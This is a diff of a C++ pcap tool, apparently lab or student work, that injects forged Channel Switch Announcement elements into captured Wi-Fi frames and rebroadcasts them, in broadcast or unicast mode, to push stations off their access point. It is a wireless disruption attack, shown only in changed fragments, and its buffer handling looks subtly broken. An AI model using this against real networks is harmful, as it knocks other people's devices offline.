@@ -8,6 +8,7 @@
 #include <time.h>
 #include <signal.h>
 #include <algorithm>
+#include <iostream>
 
 void usage();
 void macStringToUint8(char *mac_string, uint8_t *ap_mac);
@@ -27,7 +28,9 @@ int main(int argc, char *argv[]) {
     char *ap_mac = argv[2];
     char *station_mac = argv[3];
     if (station_mac != NULL) {
-        printf("Unicast Mode\n");
+        std::cout << "Unicast Mode" << std::endl;
+    }else{
+        std::cout << "Broadcast Mode" << std::endl;
     }
 
     char errbuf[PCAP_ERRBUF_SIZE];
@@ -51,8 +54,7 @@ int main(int argc, char *argv[]) {
     }
     global_handle = handle;
     signal(SIGINT, handleSignal);
-    
-    time_t start_time = time(NULL);
+
     while (true) {
         struct pcap_pkthdr *header;
         const unsigned char *cap_packet;
@@ -102,29 +104,20 @@ void process_packet(const struct pcap_pkthdr *header, const unsigned char *packe
     // Random Channel set
     uint8_t channel = rand() % 13 + 1;
     unsigned char EPR[] = {0x2a, 0x01,0x00};
-    uint8_t csa_data[5] = {0x25, 0x03, 0x01, 0x0D, 0x04};
+    uint8_t csa_data[5] = {0x25, 0x03, 0x01, channel, 0xA};
     uint8_t broadcast_addr[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
     uint16_t new_packet_len = header->caplen + sizeof(csa_data);
 
     unsigned char *new_packet = (unsigned char *)malloc(new_packet_len);
     if (new_packet == NULL) {
         fprintf(stderr, "Memory allocation failed\n");
-        return;  // 메모리 할당 실패 시 함수 종료
+        return;
     }
 
     // 패킷 복사
     memcpy(new_packet, packet, header->len);
-
-    // EPR을 찾고 CSA 데이터 삽입
-    auto it = std::search(new_packet, new_packet + header->caplen, EPR, EPR + sizeof(EPR));
-    if (it != NULL) {
-        size_t offset = it - new_packet;
-        memmove(new_packet + offset + sizeof(csa_data), new_packet + offset, header->caplen - offset);
-        memcpy(new_packet + offset, csa_data, 5);
-    } else {
-        printf("EPR not found\n");
-    }
-
+    memcpy(new_packet + header->len, csa_data, sizeof(csa_data));
+    
     // Unicast 대상인 경우, destination_address 수정
     if (station_mac != NULL) {
         auto bmac = std::search(new_packet, new_packet + new_packet_len, broadcast_addr, broadcast_addr + sizeof(broadcast_addr));
